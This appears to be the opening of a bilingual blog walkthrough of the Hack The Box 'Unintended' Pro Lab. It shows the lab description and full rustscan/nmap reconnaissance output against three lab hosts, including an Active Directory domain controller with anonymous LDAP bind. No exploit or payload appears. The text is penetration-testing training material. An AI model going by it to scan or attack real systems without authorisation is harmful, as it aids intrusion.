---
title: HTB-Unintended
description: 'Pro Labs-Unintended'
pubDate: 2026-03-23
image: /Pro-Labs/Unintended.png
categories:
  - Documentation
  - Hackthebox Prolabs
tags:
  - Hackthebox
  - Pro-Labs
---

![](/image/hackthebox-prolabs/Unintended-1.png)

# Introduction
> Unintended is a company that has recently migrated its infrastructure to Active Directory. Management is concerned that legacy practices and overlooked misconfigurations could expose the environment to external threats. Your firm has been contracted to conduct a penetration test, with the objective of determining whether an attacker can move from initial access to full control of the domain.  
Unintended 是一家最近将其基础设施迁移到 Active Directory 的公司。管理层担心遗留做法和被忽视的配置错误可能使环境暴露于外部威胁之下。贵公司已受委托进行渗透测试，目的是确定攻击者是否能从最初的访问权限转变为对该域名的完全控制。
>
> Unintended provides a hands-on experience with common missteps in Active Directory deployments, demonstrating how attackers can pivot between services to escalate privileges. It blends Linux privilege escalation techniques with Active Directory attack paths, making it a valuable practice ground for both offensive and defensive security practitioners.  
Unintended 提供了关于 Active Directory 部署中常见失误的实践体验，展示了攻击者如何在服务间切换以提升权限。它将 Linux 权限升级技术与 Active Directory 攻击路径相结合，使其成为攻防安全从业者宝贵的练习场。
>
> Unintended is designed for individuals looking to expand their knowledge of Active Directory exploitation in a Linux-centric environment. It is well-suited for those seeking to understand real-world misconfigurations in hybrid infrastructure.  
Unintended 是为希望在以 Linux 为中心的环境中扩展对 Active Directory 利用知识的个人设计的。它非常适合那些希望理解混合基础设施中真实世界配置错误的人。
>
> This Red Team Operator I lab will expose players to:  
这个红队 I 实验室将让玩家接触到：
>
> + Active Directory backup enumeration  
Active Directory 备份枚举
> + Lateral movement  横向移动
> + Network Pivoting  网络枢纽
> + Linux privilege escalation  
Linux 权限升级
> + Backup Forensics  备份法医
> + Web Application attacks  网页应用攻击
>



# Entry Poin
> 三个入口： 10.13.38.57 / 10.13.38.58 / 10.13.38.59
>

## Rustscan
```plain
┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
└─# rustscan -a 10.13.38.57,10.13.38.58,10.13.38.59 -- -A
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'

RustScan: Exploring the digital landscape, one IP at a time.
 
Open 10.13.38.59:22
Open 10.13.38.58:21
Open 10.13.38.58:22
Open 10.13.38.57:22
Open 10.13.38.57:53
Open 10.13.38.59:80
Open 10.13.38.57:88
Open 10.13.38.57:135
Open 10.13.38.57:139
Open 10.13.38.57:389
Open 10.13.38.57:445
Open 10.13.38.57:464
Open 10.13.38.57:636
Open 10.13.38.57:3269
Open 10.13.38.57:3268
Open 10.13.38.57:49152
Open 10.13.38.57:49153
Open 10.13.38.57:49154

Nmap scan report for 10.13.38.58
Host is up, received echo-reply ttl 63 (0.41s latency).
Scanned at 2026-03-22 15:23:34 CST for 28s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 pyftpdlib 1.5.7
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 10.13.38.58:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN5GJv3agTVOTvBSSviRDpZicfTbt8GBqUD2M5p6CM9OcpG5ieNJLUvSLX9Zt1YYE49eJqIMWlWh5nsHRbR926s=
|   256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDwyZJVkoQfGVoBe7SKI1AtQ/ceWCC7jiPzNzoUFZ6j0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/22%OT=21%CT=%CU=30841%PV=Y%DS=2%DC=T%G=N%TM=69BF9912
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11
OS:NW7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 47.827 days (since Mon Feb  2 19:32:42 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   496.64 ms 10.10.16.1
2   219.98 ms 10.13.38.58


Nmap scan report for 10.13.38.59
Host is up, received reset ttl 63 (0.43s latency).
Scanned at 2026-03-22 15:24:03 CST for 27s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN5GJv3agTVOTvBSSviRDpZicfTbt8GBqUD2M5p6CM9OcpG5ieNJLUvSLX9Zt1YYE49eJqIMWlWh5nsHRbR926s=
|   256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDwyZJVkoQfGVoBe7SKI1AtQ/ceWCC7jiPzNzoUFZ6j0
80/tcp open  http    syn-ack ttl 63 Werkzeug httpd 3.0.6 (Python 3.8.20)
|_http-title: Under Construction
| http-methods: 
|_  Supported Methods: HEAD OPTIONS GET
|_http-server-header: Werkzeug/3.0.6 Python/3.8.20
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
TCP/IP fingerprint:
OS:SCAN(V=7.98%E=4%D=3/22%OT=22%CT=%CU=36515%PV=Y%DS=2%DC=T%G=N%TM=69BF992E
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M542ST11NW7%O2=M542ST11NW7%O3=M542NNT11NW7%O4=M542ST11NW7%O5=M542ST11
OS:NW7%O6=M542ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M542NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 29.008 days (since Sat Feb 21 15:12:55 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   489.29 ms 10.10.16.1
2   224.70 ms 10.13.38.59


Nmap scan report for 10.13.38.57
Scanned at 2026-03-22 15:26:39 CST for 100s

PORT      STATE SERVICE      REASON         VERSION
22/tcp    open  ssh          syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 72:dd:96:5e:a9:77:be:ef:7c:54:4f:38:55:bf:69:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN5GJv3agTVOTvBSSviRDpZicfTbt8GBqUD2M5p6CM9OcpG5ieNJLUvSLX9Zt1YYE49eJqIMWlWh5nsHRbR926s=
|   256 f4:c3:6c:24:cf:eb:93:f4:14:3f:98:98:2d:fa:cb:93 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDwyZJVkoQfGVoBe7SKI1AtQ/ceWCC7jiPzNzoUFZ6j0
53/tcp    open  domain       syn-ack ttl 63 (generic dns response: NOTIMP)
88/tcp    open  kerberos-sec syn-ack ttl 63 (server time: 2026-03-22 07:26:48Z)
| fingerprint-strings: 
|   Kerberos: 
|     d~b0`
|     20260322072648Z
|     krbtgt
|_    client in request
135/tcp   open  msrpc        syn-ack ttl 63 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 63 Samba smbd 4
389/tcp   open  ldap         syn-ack ttl 63 (Anonymous bind OK)
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated HOST certificate
| Issuer: commonName=DC.unintended.vl/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated CA certificate
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-24T19:33:59
| Not valid after:  2026-01-24T19:33:59
| MD5:     6895 e6d1 03d5 bd19 d1c4 7247 7229 13c2
| SHA-1:   0f21 c144 a73b c61d cfa5 e48c 56c7 9d27 4c01 2d88
| SHA-256: 8c31 865a 2de3 2015 1a04 bc8e a683 c6fb f424 1a58 9e96 2b89 b475 cbdc 8daf 8586
| -----BEGIN CERTIFICATE-----
| MIIFqjCCA5KgAwIBAgIEp0TaZTANBgkqhkiG9w0BAQsFADBzMR0wGwYDVQQKExRT
| YW1iYSBBZG1pbmlzdHJhdGlvbjE3MDUGA1UECxMuU2FtYmEgLSB0ZW1wb3Jhcnkg
| YXV0b2dlbmVyYXRlZCBDQSBjZXJ0aWZpY2F0ZTEZMBcGA1UEAxMQREMudW5pbnRl
| bmRlZC52bDAeFw0yNDAyMjQxOTMzNTlaFw0yNjAxMjQxOTMzNTlaMHUxHTAbBgNV
| BAoTFFNhbWJhIEFkbWluaXN0cmF0aW9uMTkwNwYDVQQLEzBTYW1iYSAtIHRlbXBv
| cmFyeSBhdXRvZ2VuZXJhdGVkIEhPU1QgY2VydGlmaWNhdGUxGTAXBgNVBAMTEERD
| LnVuaW50ZW5kZWQudmwwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQCg
| 7wUlDq0Dde3+T4izCq2l6XulttkTCoRQ6aZHLBOM7P1/2Th7HI4OQnVjdIYDhsiY
| oZJMUzbrNVPn9u6Jwj+R0MILVxb8JC9tjRMMdekK8Og8qrOEE2Ywu8lZzuFYk5+3
| eZKi4YWhDtwJv7VmmPsMhEvTZzSFcYq5X3uT2fTDmME3bVTDbv6SQZVaqvWGIXSe
| KIK+JDBKqc9QTyvFTDWQVq2azrPhQ/KPM4RZvJjbYoE80IPpYfFsDxISE1sEBywz
| 0uJhkhs4vOiPUliGXAhB/FmF+d1+/uxZ34gqTXi4CNZkRrmFy2rXnBRlFjjCZEnl
| Ir3VsFFH5B0hh3lo02yySlpLpcue770FkWoyLOHQAzDmtr74IgU1+S+pOiLYKiI2
| Onnu4hLOMALVgJ9P+0Hbl2ORsI2addQcL0CRpvoz5NueWUoIGlD1ItjrgspC5cAX
| EgKw0PhpYikCwFikNdrsiwEr9cSYTEx8EfcKQf5sgNidv0tVg3VDs/Y1vbSVufag
| lPvVmHCaLilnGq8Mo1HGjkg1mcW7Kgxy0k5WTsnhBcXNbu3+ihAJG06gaO3iv5gO
| UOE0u6c2ZpmfF+KPe6WaORCGI28QN1XLZvmaYfotWSVY1VGKCJAcKXoTfYDMyIem
| Hu14FdwFUvFyq7I8RffiO6BITW4RWa9KvftRfFh6VQIDAQABo0QwQjAMBgNVHRMB
| Af8EAjAAMBMGA1UdJQQMMAoGCCsGAQUFBwMBMB0GA1UdDgQWBBR9fWQgQddm0Opp
| Jr9Sd6xqu0+0CTANBgkqhkiG9w0BAQsFAAOCAgEAjknUxQ9l1mH7HHesVTJYbFjZ
| nfv/H7qCAWbB32Z9QT3HCBtN90EKyMQwSMtvLBl4uGs8uDttoNl7cj+TLpJ6whvC
| kHuIkaiSiOVJNFL3mFtIGX0ZHgqA6c54VhFNaLqWo7UN35fN8+HdbFe0+0UqXy0u
| JPcZT5BUY1pED0E/nyV+wtUuEc34S1i009qBhBKc9cPYbeafhs6JFRgea9bHfd/q
| FA6oDyWfoRH0KZL9KqvDGGIydsSDcjsf1fuANf10RhC1w7xQmGtFlHF2ZUbsI3bj
| QIAe3Vt/f71kVGfm2FqK5IJA1lJhXjEUoIwx+JCaL1DVVcK1p9nv01YJn2tIIBj/
| UhSXEKWyadtH7FrjPozR2053DosYP14VPz33gLILoq7JEzPVPJBtc13W6Psg1HcG
| 1AbM0dXej4/m0X6OjQgC//YDaUaZeM8a9sHca18Lw7zp2/zuw8Sm9AMK8hq1xjgH
| u57HFu0TmJINCxxfKVD7r4p7Auhaq4+usXNtCYkpDHBwle44Y4qBoofsLSHoov0I
| SsJqiBk1PqZKu5GkvqPaiYd78Sx1+W34kJG14T/FZXho2uQRBzY2GkFQYg2nkDNp
| X8op47YJDpZZa8AJQzfmPbZUKaXNNwpQ4c1R76L3A/jMaxp9U1xsubYl8Qfuiqhh
| ad0oZg1iIDGRdPWaWa8=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
445/tcp   open  netbios-ssn  syn-ack ttl 63 Samba smbd 4
464/tcp   open  kpasswd5?    syn-ack ttl 63
636/tcp   open  ssl/ldap     syn-ack ttl 63 (Anonymous bind OK)
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated HOST certificate
| Issuer: commonName=DC.unintended.vl/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated CA certificate
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-24T19:33:59
| Not valid after:  2026-01-24T19:33:59
| MD5:     6895 e6d1 03d5 bd19 d1c4 7247 7229 13c2
| SHA-1:   0f21 c144 a73b c61d cfa5 e48c 56c7 9d27 4c01 2d88
| SHA-256: 8c31 865a 2de3 2015 1a04 bc8e a683 c6fb f424 1a58 9e96 2b89 b475 cbdc 8daf 8586
| -----BEGIN CERTIFICATE-----
| MIIFqjCCA5KgAwIBAgIEp0TaZTANBgkqhkiG9w0BAQsFADBzMR0wGwYDVQQKExRT
| YW1iYSBBZG1pbmlzdHJhdGlvbjE3MDUGA1UECxMuU2FtYmEgLSB0ZW1wb3Jhcnkg
| YXV0b2dlbmVyYXRlZCBDQSBjZXJ0aWZpY2F0ZTEZMBcGA1UEAxMQREMudW5pbnRl
| bmRlZC52bDAeFw0yNDAyMjQxOTMzNTlaFw0yNjAxMjQxOTMzNTlaMHUxHTAbBgNV
| BAoTFFNhbWJhIEFkbWluaXN0cmF0aW9uMTkwNwYDVQQLEzBTYW1iYSAtIHRlbXBv
| cmFyeSBhdXRvZ2VuZXJhdGVkIEhPU1QgY2VydGlmaWNhdGUxGTAXBgNVBAMTEERD
| LnVuaW50ZW5kZWQudmwwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQCg
| 7wUlDq0Dde3+T4izCq2l6XulttkTCoRQ6aZHLBOM7P1/2Th7HI4OQnVjdIYDhsiY
| oZJMUzbrNVPn9u6Jwj+R0MILVxb8JC9tjRMMdekK8Og8qrOEE2Ywu8lZzuFYk5+3
| eZKi4YWhDtwJv7VmmPsMhEvTZzSFcYq5X3uT2fTDmME3bVTDbv6SQZVaqvWGIXSe
| KIK+JDBKqc9QTyvFTDWQVq2azrPhQ/KPM4RZvJjbYoE80IPpYfFsDxISE1sEBywz
| 0uJhkhs4vOiPUliGXAhB/FmF+d1+/uxZ34gqTXi4CNZkRrmFy2rXnBRlFjjCZEnl
| Ir3VsFFH5B0hh3lo02yySlpLpcue770FkWoyLOHQAzDmtr74IgU1+S+pOiLYKiI2
| Onnu4hLOMALVgJ9P+0Hbl2ORsI2addQcL0CRpvoz5NueWUoIGlD1ItjrgspC5cAX
| EgKw0PhpYikCwFikNdrsiwEr9cSYTEx8EfcKQf5sgNidv0tVg3VDs/Y1vbSVufag
| lPvVmHCaLilnGq8Mo1HGjkg1mcW7Kgxy0k5WTsnhBcXNbu3+ihAJG06gaO3iv5gO
| UOE0u6c2ZpmfF+KPe6WaORCGI28QN1XLZvmaYfotWSVY1VGKCJAcKXoTfYDMyIem
| Hu14FdwFUvFyq7I8RffiO6BITW4RWa9KvftRfFh6VQIDAQABo0QwQjAMBgNVHRMB
| Af8EAjAAMBMGA1UdJQQMMAoGCCsGAQUFBwMBMB0GA1UdDgQWBBR9fWQgQddm0Opp
| Jr9Sd6xqu0+0CTANBgkqhkiG9w0BAQsFAAOCAgEAjknUxQ9l1mH7HHesVTJYbFjZ
| nfv/H7qCAWbB32Z9QT3HCBtN90EKyMQwSMtvLBl4uGs8uDttoNl7cj+TLpJ6whvC
| kHuIkaiSiOVJNFL3mFtIGX0ZHgqA6c54VhFNaLqWo7UN35fN8+HdbFe0+0UqXy0u
| JPcZT5BUY1pED0E/nyV+wtUuEc34S1i009qBhBKc9cPYbeafhs6JFRgea9bHfd/q
| FA6oDyWfoRH0KZL9KqvDGGIydsSDcjsf1fuANf10RhC1w7xQmGtFlHF2ZUbsI3bj
| QIAe3Vt/f71kVGfm2FqK5IJA1lJhXjEUoIwx+JCaL1DVVcK1p9nv01YJn2tIIBj/
| UhSXEKWyadtH7FrjPozR2053DosYP14VPz33gLILoq7JEzPVPJBtc13W6Psg1HcG
| 1AbM0dXej4/m0X6OjQgC//YDaUaZeM8a9sHca18Lw7zp2/zuw8Sm9AMK8hq1xjgH
| u57HFu0TmJINCxxfKVD7r4p7Auhaq4+usXNtCYkpDHBwle44Y4qBoofsLSHoov0I
| SsJqiBk1PqZKu5GkvqPaiYd78Sx1+W34kJG14T/FZXho2uQRBzY2GkFQYg2nkDNp
| X8op47YJDpZZa8AJQzfmPbZUKaXNNwpQ4c1R76L3A/jMaxp9U1xsubYl8Qfuiqhh
| ad0oZg1iIDGRdPWaWa8=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3268/tcp  open  ldap         syn-ack ttl 63 (Anonymous bind OK)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated HOST certificate
| Issuer: commonName=DC.unintended.vl/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated CA certificate
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-24T19:33:59
| Not valid after:  2026-01-24T19:33:59
| MD5:     6895 e6d1 03d5 bd19 d1c4 7247 7229 13c2
| SHA-1:   0f21 c144 a73b c61d cfa5 e48c 56c7 9d27 4c01 2d88
| SHA-256: 8c31 865a 2de3 2015 1a04 bc8e a683 c6fb f424 1a58 9e96 2b89 b475 cbdc 8daf 8586
| -----BEGIN CERTIFICATE-----
| MIIFqjCCA5KgAwIBAgIEp0TaZTANBgkqhkiG9w0BAQsFADBzMR0wGwYDVQQKExRT
| YW1iYSBBZG1pbmlzdHJhdGlvbjE3MDUGA1UECxMuU2FtYmEgLSB0ZW1wb3Jhcnkg
| YXV0b2dlbmVyYXRlZCBDQSBjZXJ0aWZpY2F0ZTEZMBcGA1UEAxMQREMudW5pbnRl
| bmRlZC52bDAeFw0yNDAyMjQxOTMzNTlaFw0yNjAxMjQxOTMzNTlaMHUxHTAbBgNV
| BAoTFFNhbWJhIEFkbWluaXN0cmF0aW9uMTkwNwYDVQQLEzBTYW1iYSAtIHRlbXBv
| cmFyeSBhdXRvZ2VuZXJhdGVkIEhPU1QgY2VydGlmaWNhdGUxGTAXBgNVBAMTEERD
| LnVuaW50ZW5kZWQudmwwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQCg
| 7wUlDq0Dde3+T4izCq2l6XulttkTCoRQ6aZHLBOM7P1/2Th7HI4OQnVjdIYDhsiY
| oZJMUzbrNVPn9u6Jwj+R0MILVxb8JC9tjRMMdekK8Og8qrOEE2Ywu8lZzuFYk5+3
| eZKi4YWhDtwJv7VmmPsMhEvTZzSFcYq5X3uT2fTDmME3bVTDbv6SQZVaqvWGIXSe
| KIK+JDBKqc9QTyvFTDWQVq2azrPhQ/KPM4RZvJjbYoE80IPpYfFsDxISE1sEBywz
| 0uJhkhs4vOiPUliGXAhB/FmF+d1+/uxZ34gqTXi4CNZkRrmFy2rXnBRlFjjCZEnl
| Ir3VsFFH5B0hh3lo02yySlpLpcue770FkWoyLOHQAzDmtr74IgU1+S+pOiLYKiI2
| Onnu4hLOMALVgJ9P+0Hbl2ORsI2addQcL0CRpvoz5NueWUoIGlD1ItjrgspC5cAX
| EgKw0PhpYikCwFikNdrsiwEr9cSYTEx8EfcKQf5sgNidv0tVg3VDs/Y1vbSVufag
| lPvVmHCaLilnGq8Mo1HGjkg1mcW7Kgxy0k5WTsnhBcXNbu3+ihAJG06gaO3iv5gO
| UOE0u6c2ZpmfF+KPe6WaORCGI28QN1XLZvmaYfotWSVY1VGKCJAcKXoTfYDMyIem
| Hu14FdwFUvFyq7I8RffiO6BITW4RWa9KvftRfFh6VQIDAQABo0QwQjAMBgNVHRMB
| Af8EAjAAMBMGA1UdJQQMMAoGCCsGAQUFBwMBMB0GA1UdDgQWBBR9fWQgQddm0Opp
| Jr9Sd6xqu0+0CTANBgkqhkiG9w0BAQsFAAOCAgEAjknUxQ9l1mH7HHesVTJYbFjZ
| nfv/H7qCAWbB32Z9QT3HCBtN90EKyMQwSMtvLBl4uGs8uDttoNl7cj+TLpJ6whvC
| kHuIkaiSiOVJNFL3mFtIGX0ZHgqA6c54VhFNaLqWo7UN35fN8+HdbFe0+0UqXy0u
| JPcZT5BUY1pED0E/nyV+wtUuEc34S1i009qBhBKc9cPYbeafhs6JFRgea9bHfd/q
| FA6oDyWfoRH0KZL9KqvDGGIydsSDcjsf1fuANf10RhC1w7xQmGtFlHF2ZUbsI3bj
| QIAe3Vt/f71kVGfm2FqK5IJA1lJhXjEUoIwx+JCaL1DVVcK1p9nv01YJn2tIIBj/
| UhSXEKWyadtH7FrjPozR2053DosYP14VPz33gLILoq7JEzPVPJBtc13W6Psg1HcG
| 1AbM0dXej4/m0X6OjQgC//YDaUaZeM8a9sHca18Lw7zp2/zuw8Sm9AMK8hq1xjgH
| u57HFu0TmJINCxxfKVD7r4p7Auhaq4+usXNtCYkpDHBwle44Y4qBoofsLSHoov0I
| SsJqiBk1PqZKu5GkvqPaiYd78Sx1+W34kJG14T/FZXho2uQRBzY2GkFQYg2nkDNp
| X8op47YJDpZZa8AJQzfmPbZUKaXNNwpQ4c1R76L3A/jMaxp9U1xsubYl8Qfuiqhh
| ad0oZg1iIDGRdPWaWa8=
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap     syn-ack ttl 63 (Anonymous bind OK)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.unintended.vl/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated HOST certificate
| Issuer: commonName=DC.unintended.vl/organizationName=Samba Administration/organizationalUnitName=Samba - temporary autogenerated CA certificate
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-02-24T19:33:59
| Not valid after:  2026-01-24T19:33:59
| MD5:     6895 e6d1 03d5 bd19 d1c4 7247 7229 13c2
| SHA-1:   0f21 c144 a73b c61d cfa5 e48c 56c7 9d27 4c01 2d88
| SHA-256: 8c31 865a 2de3 2015 1a04 bc8e a683 c6fb f424 1a58 9e96 2b89 b475 cbdc 8daf 8586
| -----BEGIN CERTIFICATE-----
| MIIFqjCCA5KgAwIBAgIEp0TaZTANBgkqhkiG9w0BAQsFADBzMR0wGwYDVQQKExRT
| YW1iYSBBZG1pbmlzdHJhdGlvbjE3MDUGA1UECxMuU2FtYmEgLSB0ZW1wb3Jhcnkg
| YXV0b2dlbmVyYXRlZCBDQSBjZXJ0aWZpY2F0ZTEZMBcGA1UEAxMQREMudW5pbnRl
| bmRlZC52bDAeFw0yNDAyMjQxOTMzNTlaFw0yNjAxMjQxOTMzNTlaMHUxHTAbBgNV
| BAoTFFNhbWJhIEFkbWluaXN0cmF0aW9uMTkwNwYDVQQLEzBTYW1iYSAtIHRlbXBv
| cmFyeSBhdXRvZ2VuZXJhdGVkIEhPU1QgY2VydGlmaWNhdGUxGTAXBgNVBAMTEERD
| LnVuaW50ZW5kZWQudmwwggIiMA0GCSqGSIb3DQEBAQUAA4ICDwAwggIKAoICAQCg
| 7wUlDq0Dde3+T4izCq2l6XulttkTCoRQ6aZHLBOM7P1/2Th7HI4OQnVjdIYDhsiY
| oZJMUzbrNVPn9u6Jwj+R0MILVxb8JC9tjRMMdekK8Og8qrOEE2Ywu8lZzuFYk5+3
| eZKi4YWhDtwJv7VmmPsMhEvTZzSFcYq5X3uT2fTDmME3bVTDbv6SQZVaqvWGIXSe
| KIK+JDBKqc9QTyvFTDWQVq2azrPhQ/KPM4RZvJjbYoE80IPpYfFsDxISE1sEBywz
| 0uJhkhs4vOiPUliGXAhB/FmF+d1+/uxZ34gqTXi4CNZkRrmFy2rXnBRlFjjCZEnl
| Ir3VsFFH5B0hh3lo02yySlpLpcue770FkWoyLOHQAzDmtr74IgU1+S+pOiLYKiI2
| Onnu4hLOMALVgJ9P+0Hbl2ORsI2addQcL0CRpvoz5NueWUoIGlD1ItjrgspC5cAX
| EgKw0PhpYikCwFikNdrsiwEr9cSYTEx8EfcKQf5sgNidv0tVg3VDs/Y1vbSVufag
| lPvVmHCaLilnGq8Mo1HGjkg1mcW7Kgxy0k5WTsnhBcXNbu3+ihAJG06gaO3iv5gO
| UOE0u6c2ZpmfF+KPe6WaORCGI28QN1XLZvmaYfotWSVY1VGKCJAcKXoTfYDMyIem
| Hu14FdwFUvFyq7I8RffiO6BITW4RWa9KvftRfFh6VQIDAQABo0QwQjAMBgNVHRMB
| Af8EAjAAMBMGA1UdJQQMMAoGCCsGAQUFBwMBMB0GA1UdDgQWBBR9fWQgQddm0Opp
| Jr9Sd6xqu0+0CTANBgkqhkiG9w0BAQsFAAOCAgEAjknUxQ9l1mH7HHesVTJYbFjZ
| nfv/H7qCAWbB32Z9QT3HCBtN90EKyMQwSMtvLBl4uGs8uDttoNl7cj+TLpJ6whvC
| kHuIkaiSiOVJNFL3mFtIGX0ZHgqA6c54VhFNaLqWo7UN35fN8+HdbFe0+0UqXy0u
| JPcZT5BUY1pED0E/nyV+wtUuEc34S1i009qBhBKc9cPYbeafhs6JFRgea9bHfd/q
| FA6oDyWfoRH0KZL9KqvDGGIydsSDcjsf1fuANf10RhC1w7xQmGtFlHF2ZUbsI3bj
| QIAe3Vt/f71kVGfm2FqK5IJA1lJhXjEUoIwx+JCaL1DVVcK1p9nv01YJn2tIIBj/
| UhSXEKWyadtH7FrjPozR2053DosYP14VPz33gLILoq7JEzPVPJBtc13W6Psg1HcG
| 1AbM0dXej4/m0X6OjQgC//YDaUaZeM8a9sHca18Lw7zp2/zuw8Sm9AMK8hq1xjgH
| u57HFu0TmJINCxxfKVD7r4p7Auhaq4+usXNtCYkpDHBwle44Y4qBoofsLSHoov0I
| SsJqiBk1PqZKu5GkvqPaiYd78Sx1+W34kJG14T/FZXho2uQRBzY2GkFQYg2nkDNp
| X8op47YJDpZZa8AJQzfmPbZUKaXNNwpQ4c1R76L3A/jMaxp9U1xsubYl8Qfuiqhh
| ad0oZg1iIDGRdPWaWa8=
|_-----END CERTIFICATE-----
49152/tcp open  msrpc        syn-ack ttl 63 Microsoft Windows RPC
